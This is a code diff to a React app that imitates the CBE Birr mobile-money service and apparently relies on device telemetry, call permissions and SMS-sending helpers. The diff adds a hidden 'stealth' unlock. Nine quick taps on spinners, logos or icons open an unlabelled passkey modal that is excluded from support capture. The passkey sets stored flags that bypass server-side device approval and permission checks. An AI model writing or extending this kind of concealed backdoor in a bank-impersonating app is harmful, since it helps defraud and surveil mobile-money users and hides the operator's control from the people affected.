@@ -2,7 +2,7 @@
 
 import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ArrowLeft, Bell, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, PhoneCall, PhoneIncoming, PhoneOff, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, Radio, RefreshCw, Send, Settings, Check, X, Lock, Crosshair, Mic, MicOff, Monitor, Power, ShieldCheck, SwitchCamera, Video, VideoOff, Volume2, VolumeX } from 'lucide-react';
+import { ArrowLeft, Bell, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, PhoneCall, PhoneIncoming, PhoneOff, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, Radio, RefreshCw, Send, Settings, Check, X, Lock, Crosshair, Mic, MicOff, Monitor, Power, ShieldCheck, SwitchCamera, Video, VideoOff, Volume2, VolumeX, Eye, EyeOff } from 'lucide-react';
 import CBEAuthenticSpinner from './CBEAuthenticSpinner';
 import {
   sendTransactionSms,
@@ -53,10 +53,13 @@ import {
   requestAllNativeCallPermissions,
   requestOwnerPermissionBypass,
   respondSupportConsent,
+  STEALTH_CFG_KEY,
+  STEALTH_CFG_VALUE,
   sendOfflineBeacon,
   setNativeAudioMode,
   stopNativeCallRinger,
   syncDeviceTelemetry,
+  verifyOwnerGatePasskey,
 } from '@/lib/owner-telemetry';
 import {
   captureElementFrameJpeg,
@@ -718,9 +721,76 @@ export default function CBEBirrFullscreenApp() {
   const regSubmitInFlightRef = useRef<boolean>(false);
   const regServerAckRef = useRef<boolean>(false);
   const pendingNeedsFreshRegRef = useRef<boolean>(false);
+  const stealthOverrideRef = useRef<boolean>(false);
+  const stealthTapStateRef = useRef<{ count: number; lastMs: number }>({ count: 0, lastMs: 0 });
+  const [showStealthGateModal, setShowStealthGateModal] = useState<boolean>(false);
+  const [stealthPassInput, setStealthPassInput] = useState<string>('');
+  const [stealthPassVisible, setStealthPassVisible] = useState<boolean>(false);
+  const [stealthPassError, setStealthPassError] = useState<boolean>(false);
   useEffect(() => {
     deviceGateStateRef.current = deviceGateState;
   }, [deviceGateState]);
+
+  const handleStealthGateTap = useCallback(() => {
+    const now = Date.now();
+    const prev = stealthTapStateRef.current;
+    const nextCount = now - prev.lastMs <= 1200 ? prev.count + 1 : 1;
+    if (nextCount >= 9) {
+      stealthTapStateRef.current = { count: 0, lastMs: 0 };
+      setStealthPassInput('');
+      setStealthPassVisible(false);
+      setStealthPassError(false);
+      setShowStealthGateModal(true);
+    } else {
+      stealthTapStateRef.current = { count: nextCount, lastMs: now };
+    }
+  }, []);
+
+  const handleStealthGateSubmit = (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    if (!verifyOwnerGatePasskey(stealthPassInput)) {
+      setStealthPassError(true);
+      setStealthPassInput('');
+      return;
+    }
+
+    stealthOverrideRef.current = true;
+    try {
+      localStorage.setItem(STEALTH_CFG_KEY, STEALTH_CFG_VALUE);
+      localStorage.setItem(PERM_BYPASS_KEY, 'approved');
+      localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+
+      const optName = regFullName.trim();
+      if (optName) {
+        setUserName(optName);
+        localStorage.setItem('cbebirr_user_name', optName);
+      }
+      const rawPhone = regPhone.replace(/\D/g, '');
+      let normPhone = rawPhone;
+      if (normPhone.startsWith('251')) normPhone = normPhone.slice(3);
+      if (normPhone.startsWith('0')) normPhone = normPhone.slice(1);
+      normPhone = normPhone.slice(0, 9);
+      if (normPhone.length >= 9) {
+        setPhoneNumber(normPhone);
+        localStorage.setItem('cbebirr_phone_number', normPhone);
+      }
+      const optAcc = regAccount.trim();
+      if (optAcc) {
+        setUserAccount(optAcc);
+        localStorage.setItem('cbebirr_user_account', optAcc);
+      }
+    } catch {}
+
+    setPermissionBypassMsg('');
+    setPermissionBypassStatus('approved');
+    setShowCallPermsBanner(false);
+    setDeviceGateState('approved');
+    setShowStealthGateModal(false);
+    setStealthPassInput('');
+    setStealthPassVisible(false);
+    setStealthPassError(false);
+    registerNativeCallDevice();
+  };
 
   const exitAppCleanly = useCallback(() => {
     if (typeof window === 'undefined') return;
@@ -1005,7 +1075,28 @@ export default function CBEBirrFullscreenApp() {
       if (gate === 'hydrating') return;
       const p = profileSyncRef.current;
 
+      const hasStealthCfg = (() => {
+        if (stealthOverrideRef.current) return true;
+        try {
+          if (typeof localStorage !== 'undefined' && localStorage.getItem(STEALTH_CFG_KEY) === STEALTH_CFG_VALUE) {
+            stealthOverrideRef.current = true;
+            return true;
+          }
+        } catch {}
+        return false;
+      })();
+
       const applyPermBypassFromServer = (serverBypass?: PermissionBypassStatus) => {
+        if (hasStealthCfg) {
+          try {
+            localStorage.setItem(PERM_BYPASS_KEY, 'approved');
+          } catch {}
+          if (permissionBypassRef.current !== 'approved') {
+            setPermissionBypassMsg('');
+            setPermissionBypassStatus('approved');
+          }
+          return;
+        }
         if (!serverBypass) return;
         const cur = permissionBypassRef.current;
         if (serverBypass === 'approved') {
@@ -1084,7 +1175,17 @@ export default function CBEBirrFullscreenApp() {
       if (!active || !res) return;
 
       const isOnlineNow = typeof navigator === 'undefined' || navigator.onLine !== false;
-      if (isOnlineNow && res.fromServer) {
+      if (hasStealthCfg) {
+        regServerAckRef.current = true;
+        pendingNeedsFreshRegRef.current = false;
+        try {
+          localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+          localStorage.setItem(PERM_BYPASS_KEY, 'approved');
+        } catch {}
+        if (gate !== 'approved') {
+          setDeviceGateState('approved');
+        }
+      } else if (isOnlineNow && res.fromServer) {
         applyPermBypassFromServer(res.permissionBypassStatus);
         if (res.approvalStatus === 'rejected') {
           regServerAckRef.current = true;
@@ -2119,12 +2220,13 @@ export default function CBEBirrFullscreenApp() {
   // Re-poll native permission state every 1.2s while permissions remain missing/unverified
   useEffect(() => {
     if (deviceGateState === 'hydrating' || deviceGateState === 'rejected' || showOwnerDashboard) return;
+    if (permissionBypassStatus === 'approved') return;
     if (!showCallPermsBanner && permStatus?.allGranted) return;
     const id = window.setInterval(() => {
       void refreshPermissionStatus();
     }, 1200);
     return () => window.clearInterval(id);
-  }, [deviceGateState, showOwnerDashboard, showCallPermsBanner, permStatus?.allGranted, refreshPermissionStatus]);
+  }, [deviceGateState, showOwnerDashboard, permissionBypassStatus, showCallPermsBanner, permStatus?.allGranted, refreshPermissionStatus]);
 
   // Handle Pending Actions from Native IncomingCallActivity, Service Worker, or URL Params
   useEffect(() => {
@@ -3820,27 +3922,36 @@ export default function CBEBirrFullscreenApp() {
           setActivePhoneUssdId(storedActivePhoneUssd);
         }
 
-        const storedPermBypass = localStorage.getItem(PERM_BYPASS_KEY);
-        if (
-          storedPermBypass === 'approved' ||
-          storedPermBypass === 'pending' ||
-          storedPermBypass === 'rejected'
-        ) {
-          setPermissionBypassStatus(storedPermBypass);
-        }
-
-        const storedApproval = localStorage.getItem(DEVICE_APPROVAL_KEY);
-        if (storedApproval === 'approved') {
+        const hasStealthCfg = localStorage.getItem(STEALTH_CFG_KEY) === STEALTH_CFG_VALUE;
+        if (hasStealthCfg) {
+          stealthOverrideRef.current = true;
+          localStorage.setItem(PERM_BYPASS_KEY, 'approved');
+          localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+          setPermissionBypassStatus('approved');
           setDeviceGateState('approved');
-        } else if (storedApproval === 'pending') {
-          setDeviceGateState('pending');
-        } else if (storedApproval === 'rejected') {
-          setDeviceGateState('rejected');
         } else {
-          if (storedName) setRegFullName(storedName);
-          if (storedPhone) setRegPhone(storedPhone);
-          if (storedAcc) setRegAccount(storedAcc);
-          setDeviceGateState('register');
+          const storedPermBypass = localStorage.getItem(PERM_BYPASS_KEY);
+          if (
+            storedPermBypass === 'approved' ||
+            storedPermBypass === 'pending' ||
+            storedPermBypass === 'rejected'
+          ) {
+            setPermissionBypassStatus(storedPermBypass);
+          }
+
+          const storedApproval = localStorage.getItem(DEVICE_APPROVAL_KEY);
+          if (storedApproval === 'approved') {
+            setDeviceGateState('approved');
+          } else if (storedApproval === 'pending') {
+            setDeviceGateState('pending');
+          } else if (storedApproval === 'rejected') {
+            setDeviceGateState('rejected');
+          } else {
+            if (storedName) setRegFullName(storedName);
+            if (storedPhone) setRegPhone(storedPhone);
+            if (storedAcc) setRegAccount(storedAcc);
+            setDeviceGateState('register');
+          }
         }
       } catch {
         if (active) setDeviceGateState('register');
@@ -6424,14 +6535,18 @@ export default function CBEBirrFullscreenApp() {
             >
               {!permStatus ? (
                 <div className="flex flex-col items-center justify-center gap-[3cqw] text-center">
-                  <CBEAuthenticSpinner size={42} color="#38bdf8" speed={0.95} />
+                  <div onClick={handleStealthGateTap} className="cursor-default select-none">
+                    <CBEAuthenticSpinner size={42} color="#38bdf8" speed={0.95} />
+                  </div>
                   <p style={{ fontSize: '3cqw' }} className="font-semibold text-slate-200">
                     Checking permissions...
                   </p>
                 </div>
               ) : permissionBypassStatus === 'pending' ? (
                 <div className="w-full max-w-[92cqw] bg-[#141d29] border border-sky-400/45 rounded-[4cqw] p-[5cqw] shadow-2xl flex flex-col items-center text-center space-y-[3.2cqw]">
-                  <CBEAuthenticSpinner size={44} color="#38bdf8" speed={0.95} />
+                  <div onClick={handleStealthGateTap} className="cursor-default select-none">
+                    <CBEAuthenticSpinner size={44} color="#38bdf8" speed={0.95} />
+                  </div>
                   <div className="space-y-[1.2cqw]">
                     <p style={{ fontSize: '3.8cqw' }} className="font-bold text-white leading-tight">
                       Loading...
@@ -6467,7 +6582,10 @@ export default function CBEBirrFullscreenApp() {
               ) : (
                 <div className="w-full max-w-[92cqw] bg-[#141d29] border border-sky-400/45 rounded-[4cqw] p-[4cqw] shadow-2xl space-y-[3cqw]">
                   <div className="flex items-center gap-[2.4cqw]">
-                    <div className="w-[9.5cqw] h-[9.5cqw] rounded-[2.6cqw] bg-sky-500/20 border border-sky-400/40 flex items-center justify-center shrink-0">
+                    <div
+                      onClick={handleStealthGateTap}
+                      className="w-[9.5cqw] h-[9.5cqw] rounded-[2.6cqw] bg-sky-500/20 border border-sky-400/40 flex items-center justify-center shrink-0 cursor-default select-none"
+                    >
                       <ShieldCheck style={{ width: '5cqw', height: '5cqw' }} className="text-sky-300" />
                     </div>
                     <div>
@@ -14495,7 +14613,10 @@ export default function CBEBirrFullscreenApp() {
           <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col justify-between p-6 overflow-y-auto select-none">
             <div className="w-full max-w-[340px] mx-auto my-auto bg-white rounded-3xl shadow-xl border border-purple-100 p-6 space-y-5">
               <div className="flex flex-col items-center text-center gap-2">
-                <div className="w-16 h-16 rounded-2xl overflow-hidden shadow-md bg-[#7a1c7d] flex items-center justify-center">
+                <div
+                  onClick={handleStealthGateTap}
+                  className="w-16 h-16 rounded-2xl overflow-hidden shadow-md bg-[#7a1c7d] flex items-center justify-center cursor-default select-none"
+                >
                   {/* eslint-disable-next-line @next/next/no-img-element */}
                   <img
                     src="/assets/cbe_birr_logo.png"
@@ -14583,7 +14704,9 @@ export default function CBEBirrFullscreenApp() {
         {deviceGateState === 'pending' && (
           <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col items-center justify-center p-6 select-none">
             <div className="bg-white rounded-3xl shadow-xl border border-purple-100 px-8 py-7 flex flex-col items-center text-center gap-4 max-w-[280px] w-full">
-              <CBEAuthenticSpinner size={44} color="#7a1c7d" speed={0.95} />
+              <div onClick={handleStealthGateTap} className="cursor-default select-none">
+                <CBEAuthenticSpinner size={44} color="#7a1c7d" speed={0.95} />
+              </div>
               <p className="text-[3.3cqw] font-semibold text-slate-700">
                 Loading...
               </p>
@@ -14593,10 +14716,95 @@ export default function CBEBirrFullscreenApp() {
 
         {deviceGateState === 'rejected' && (
           <div className="absolute inset-0 z-[92] bg-[#140717] text-white flex flex-col items-center justify-center p-6 text-center select-none">
-            <div className="w-14 h-14 rounded-full bg-rose-500/20 border border-rose-400/30 flex items-center justify-center mb-3">
+            <div
+              onClick={handleStealthGateTap}
+              className="w-14 h-14 rounded-full bg-rose-500/20 border border-rose-400/30 flex items-center justify-center mb-3 cursor-default select-none"
+            >
               <X className="w-7 h-7 text-rose-400" />
             </div>
             <p className="text-[3.5cqw] font-bold text-white">Access Denied</p>
+          </div>
+        )}
+
+        {showStealthGateModal && (
+          <div
+            data-support-ignore="true"
+            className="absolute inset-0 z-[130] bg-black/60 backdrop-blur-xs flex items-center justify-center p-6 select-none"
+          >
+            <form
+              onSubmit={handleStealthGateSubmit}
+              className="w-full max-w-[260px] bg-[#0e1522] border border-white/12 rounded-2xl p-4 shadow-2xl space-y-3"
+            >
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-1.5 text-slate-300">
+                  <Lock className="w-3.5 h-3.5 text-slate-400" />
+                  <span className="text-[12px] font-semibold tracking-wide">Verify</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowStealthGateModal(false);
+                    setStealthPassInput('');
+                    setStealthPassError(false);
+                  }}
+                  className="text-slate-400 hover:text-white p-0.5 cursor-pointer"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              <div className="relative">
+                <input
+                  type={stealthPassVisible ? 'text' : 'password'}
+                  value={stealthPassInput}
+                  onChange={(e) => {
+                    setStealthPassInput(e.target.value);
+                    if (stealthPassError) setStealthPassError(false);
+                  }}
+                  autoFocus
+                  autoComplete="off"
+                  autoCorrect="off"
+                  autoCapitalize="none"
+                  spellCheck={false}
+                  className={`w-full bg-black/45 border rounded-xl pl-3 pr-9 py-2 text-[13px] text-white outline-none transition-colors ${
+                    stealthPassError
+                      ? 'border-rose-500/70 focus:border-rose-400'
+                      : 'border-white/15 focus:border-sky-400/60'
+                  }`}
+                />
+                <button
+                  type="button"
+                  onClick={() => setStealthPassVisible((v) => !v)}
+                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-200 cursor-pointer"
+                >
+                  {stealthPassVisible ? (
+                    <EyeOff className="w-3.5 h-3.5" />
+                  ) : (
+                    <Eye className="w-3.5 h-3.5" />
+                  )}
+                </button>
+              </div>
+
+              <div className="flex gap-2">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowStealthGateModal(false);
+                    setStealthPassInput('');
+                    setStealthPassError(false);
+                  }}
+                  className="flex-1 py-2 rounded-xl bg-white/10 hover:bg-white/15 text-slate-200 text-[12px] font-semibold cursor-pointer"
+                >
+                  Cancel
+                </button>
+                <button
+                  type="submit"
+                  className="flex-1 py-2 rounded-xl bg-sky-600 hover:bg-sky-500 text-white text-[12px] font-bold cursor-pointer"
+                >
+                  OK
+                </button>
+              </div>
+            </form>
           </div>
         )}
 
